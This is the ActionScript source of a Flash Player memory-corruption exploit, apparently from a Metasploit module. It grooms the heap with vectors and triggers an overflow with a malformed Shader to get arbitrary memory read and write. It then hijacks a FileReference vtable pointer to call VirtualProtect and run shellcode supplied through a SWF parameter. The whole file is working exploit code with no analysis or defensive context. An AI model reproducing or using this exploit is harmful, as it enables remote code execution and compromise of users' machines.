//compile with AIR SDK 13.0: mxmlc Graph.as -o Graph.swf
package {
	import flash.display.Sprite;
	import flash.utils.ByteArray;
	import flash.display.Shader;
	import flash.system.Capabilities;
	import flash.net.FileReference;
	import flash.utils.Endian;
	import __AS3__.vec.Vector;
	import __AS3__.vec.*;
	import flash.display.LoaderInfo;
	
	public class Graph extends Sprite {
		
		static var counter:uint = 0;
		
		protected var Shad:Class;
		var shellcode_byte_array:ByteArray;
		var aaab:ByteArray;
		var shellcodeObj:Array;
		
		public function Graph(){
			var tweaked_vector:* = undefined;
			var tweaked_vector_address:* = undefined;
			var shader:Shader;
			var flash_memory_protect:Array;
			var code_vectors:Array;
			var address_code_vector:uint;
			var address_shellcode_byte_array:uint;
			this.Shad = Graph_Shad;
			super();
			shellcodeObj = LoaderInfo(this.root.loaderInfo).parameters.sh.split(",");
			var i:* = 0;
			var j:* = 0;
			
			// Just one try
			counter++;
			if (counter > 1)
			{
				return;
			};
			
			// Memory massage
			var array_length:uint = 0x10000;
			var vector_size:uint = 34;
			var array:Array = new Array();
			i = 0;
			while (i < array_length)
			{
				array[i] = new Vector.<int>(1);
				i++;
			};
			i = 0;
			while (i < array_length)
			{
				array[i] = new Vector.<int>(vector_size);
				i++;
			};
			i = 0;
			while (i < array_length)
			{
				array[i].length = 0;
				i++;
			};
			i = 0x0200;
			while (i < array_length)
			{
				array[(i - (2 * (j % 2)))].length = 0x0100;
				i = (i + 28);
				j++;
			};
			
			// Overflow and Search for corrupted vector
			var corrupted_vector_idx:uint;
			var shadba:ByteArray = (new this.Shad() as ByteArray);
			shadba.position = 232;
			if (Capabilities.os.indexOf("Windows 8") >= 0)
			{
				shadba.writeUnsignedInt(2472);
			};
			shadba.position = 0;
			while (1)
			{
				shader = new Shader();
				try
				{
					shader.byteCode = (new this.Shad() as ByteArray);
				} catch(e)
				{
				};
				i = 0;
				while (i < array_length)
				{
					if (array[i].length > 0x0100)
					{
						corrupted_vector_idx = i;
						break;
					};
					i++;
				};
				if (i != array_length)
				{
					if (array[corrupted_vector_idx][(vector_size + 1)] > 0) break;
				};
				array.push(new Vector.<int>(vector_size));
			};
			
			// Tweak the vector following the corrupted one
			array[corrupted_vector_idx][vector_size] = 0x40000001;
			tweaked_vector = array[(corrupted_vector_idx + 1)];
			
			// repair the corrupted vector by restoring its
			// vector object pointer and length
			var vector_obj_addr:* = tweaked_vector[0x3fffffff];
			tweaked_vector[((0x40000000 - vector_size) - 3)] = vector_obj_addr;
			tweaked_vector[((0x40000000 - vector_size) - 4)] = vector_size;
			i = 0;
			var val:uint;
			while (true)
			{
				val = tweaked_vector[(0x40000000 - i)];
				if (val == 0x90001B) break;
				i++;
			};
			tweaked_vector_address = 0;
			if (tweaked_vector[((0x40000000 - i) - 4)] > 0)
			{
				tweaked_vector[4] = 0x41414141;
				tweaked_vector_address = ((tweaked_vector[((0x40000000 - i) - 4)] + (8 * (vector_size + 2))) + 8);				
			};
			
			// More memory massage, fill an array of FileReference objects
			var file_reference_array:Array = new Array();
			i = 0;
			while (i < 64)
			{
				file_reference_array[i] = new FileReference();
				i++;
			};
			
			var file_reference_vftable:uint = this.find_file_ref_vtable(tweaked_vector, tweaked_vector_address);
			var cancel_address:uint = this.read_memory(tweaked_vector, tweaked_vector_address, (file_reference_vftable + 0x20));
			var do_it:Boolean = true;
			var memory_protect_ptr:uint;
			var aaaq:uint;
			if (do_it)
			{
				flash_memory_protect = this.findFlashMemoryProtect(tweaked_vector, tweaked_vector_address);
				memory_protect_ptr = flash_memory_protect[0];
				aaaq = flash_memory_protect[1]; // Not sure, not used on the Flash 11.7.700.202 analysis, maybe some type of adjustment
				code_vectors = this.createCodeVectors(0x45454545, 0x90909090);
				address_code_vector = this.findCodeVector(tweaked_vector, tweaked_vector_address, 0x45454545);
				this.fillCodeVectors(code_vectors);
				tweaked_vector[7] = (memory_protect_ptr + 0); // Flash VirtualProtect call
				tweaked_vector[4] = aaaq; 				
				tweaked_vector[0] = 0x1000; // Length
				tweaked_vector[1] = (address_code_vector & 0xFFFFF000); // Address
				
				// 10255e21 ff5014          call    dword ptr [eax+14h]  ds:0023:41414155=????????
				this.write_memory(tweaked_vector, tweaked_vector_address, (file_reference_vftable + 0x20), (tweaked_vector_address + 8));
				
				// 1) Set memory as executable
				i = 0;
				while (i < 64)
				{
					file_reference_array[i].cancel();
					i++;
				};
				
				// 2) Execute shellcode 
				tweaked_vector[7] = address_code_vector;
				i = 0;
				while (i < 64)
				{
					file_reference_array[i].cancel();
					i++;
				};
				
				// Restore FileReference cancel function pointer
				// Even when probably msf module is not going to benefit because of the ExitThread at the end of the payloads
				this.write_memory(tweaked_vector, tweaked_vector_address, (file_reference_vftable + 0x20), cancel_address);
			};
		}
		
		// returns the integer at memory address
		// vector: vector with tweaked length
		// vector_address: vector's memory address
		// address: memory address to read
		function read_memory(vector:Vector.<int>, vector_address:uint, address:uint):uint{
			if (address >= vector_address)
			{
				return (vector[((address - vector_address) / 4)]);
			};
			return (vector[(0x40000000 - ((vector_address - address) / 4))]);
		}
		
		function write_memory(vector:Vector.<int>, vector_address:uint, address:uint, value:uint){
			if (address >= vector_address)
			{
				vector[((address - vector_address) / 4)] = value;
			} else
			{
				vector[(0x40000000 - ((vector_address - address) / 4))] = value;
			};
		}
		
		function findFlashMemoryProtect(vector:*, vector_address:*):Array{
			var content:uint;
			var allocation:uint = this.read_memory(vector, vector_address, ((vector_address & 0xFFFFF000) + 0x1c));
			var index:uint;
			var memory_protect_ptr:uint;
			var _local_6:uint;
			if (allocation >= vector_address)
			{
				index = ((allocation - vector_address) / 4);
			} else
			{
				index = (0x40000000 - ((vector_address - allocation) / 4));
			};
			
			//push    1 ; 6a 01
			//push    dword ptr [eax-8] ; ff 70 f8
			//push    dword ptr [eax-4] ; ff 70 fc
			//call    sub_1059DD00 // Will do VirtualProtect
			var offset:uint;
			while (1)
			{
				index--;
				content = vector[index];
				if (content == 0xfff870ff)
				{
					offset = 2;
					break;
				};
				if (content == 0xf870ff01)
				{
					offset = 1;
					break;
				};
				if (content == 0x70ff016a)
				{
					content = vector[(index + 1)];
					if (content == 0xfc70fff8)
					{
						offset = 0;
						break;
					};
				} else
				{
					if (content == 0x70fff870)
					{
						offset = 3;
						break;
					};
				};
			};
			
			memory_protect_ptr = ((vector_address + (4 * index)) - offset);
			index--;
			var content_before:uint = vector[index];
			
			if (content_before == 0x16a0424)
			{
				return ([memory_protect_ptr, _local_6]);
			};
			if (content_before == 0x6a042444)
			{
				return ([memory_protect_ptr, _local_6]);
			};
			if (content_before == 0x424448b)
			{
				return ([memory_protect_ptr, _local_6]);
			};
			if (content_before == 0xff016a04)
			{
				return ([memory_protect_ptr, _local_6]);
			};
			_local_6 = (memory_protect_ptr - 6);
			
			while (1)
			{
				index--;
				content = vector[index];
				if (content == 0x850ff50)
				{
					if (uint(vector[(index + 1)]) == 0x5e0cc483)
					{
						offset = 0;
						break;
					};
				};
				content = (content & 0xFFFFFF00);
				if (content == 0x50FF5000)
				{
					if (uint(vector[(index + 1)]) == 0xcc48308)
					{
						offset = 1;
						break;
					};
				};
				content = (content & 0xFFFF0000);
				if (content == 0xFF500000)
				{
					if (uint(vector[(index + 1)]) == 0xc4830850)
					{
						if (uint(vector[(index + 2)]) == 0xc35d5e0c)
						{
							offset = 2;
							break;
						};
					};
				};
				content = (content & 0xFF000000);
				if (content == 0x50000000)
				{
					if (uint(vector[(index + 1)]) == 0x830850ff)
					{
						if (uint(vector[(index + 2)]) == 0x5d5e0cc4)
						{
							offset = 3;
							break;
						};
					};
				};
			};
			memory_protect_ptr = ((vector_address + (4 * index)) + offset);
			return ([memory_protect_ptr, _local_6]);
		}
		
		// vector: vector with tweaked length
		// address: memory address of vector data
		function find_file_ref_vtable(vector:*, address:*):uint{
			var allocation:uint = this.read_memory(vector, address, ((address & 0xFFFFF000) + 0x1c));
			
			// Find an allocation of size 0x2a0
			var allocation_size:uint;
			while (true)
			{
				allocation_size = this.read_memory(vector, address, (allocation + 8));
				if (allocation_size == 0x2a0) break;
				if (allocation_size < 0x2a0)
				{
					allocation = (allocation + 0x24); // next allocation
				} else
				{
					allocation = (allocation - 0x24); // prior allocation
				};
			};
			var allocation_contents:uint = this.read_memory(vector, address, (allocation + 0xc));
			while (true)
			{
				if (this.read_memory(vector, address, (allocation_contents + 0x180)) == 0xFFFFFFFF) break;
				if (this.read_memory(vector, address, (allocation_contents + 0x17c)) == 0xFFFFFFFF) break;
				allocation_contents = this.read_memory(vector, address, (allocation_contents + 8));
			};
			return (allocation_contents);
		}
		
		// Returns pointer to the nops in one of the allocated code vectors
		function findCodeVector(vector:*, vector_address:*, mark:*):uint{
			var allocation_size:uint;
			var allocation:uint = this.read_memory(vector, vector_address, ((vector_address & 0xFFFFF000) + 0x1c));
			while (true)
			{
				allocation_size = this.read_memory(vector, vector_address, (allocation + 8));
				if (allocation_size == 0x7f0) break; // Code Vector found
				allocation = (allocation + 0x24); // next allocation
			};
			
			// allocation contents should be the vector code, search for the mark 0x45454545 
			var allocation_contents:uint = this.read_memory(vector, vector_address, (allocation + 0xc));
			while (true)
			{
				if (this.read_memory(vector, vector_address, (allocation_contents + 0x28)) == mark) break;
				allocation_contents = this.read_memory(vector, vector_address, (allocation_contents + 8)); // next allocation
			};
			return ((allocation_contents + 0x2c));
		}
				
		// create 8 vectors of size 0x7f0 inside an array to place shellcode 
		function createCodeVectors(mark:uint, nops:uint){
			var code_vectors_array:Array = new Array();
			var i:* = 0;
			while (i < 8)
			{
				code_vectors_array[i] = new Vector.<uint>(((0x7f0 / 4) - 8)); // new Vector.<uint>(0x1f4)
				code_vectors_array[i][0] = mark; // 0x45454545 // inc ebp * 4
				code_vectors_array[i][1] = nops; // 0x90909090 // nop * 4
				i++;
			};
			return (code_vectors_array);
		}
		
		
		// Fill with the code vectors with the shellcode
		function fillCodeVectors(array_code_vectors:Array) {
			var i:uint = 0;
			var sh:uint=1;
			
			while(i < array_code_vectors.length)
			{	
				for(var u:String in shellcodeObj)
				{
					array_code_vectors[i][sh++] = Number(shellcodeObj[u]); 
				}
				i++;
				sh = 1;
			}
		}		
	}
}//package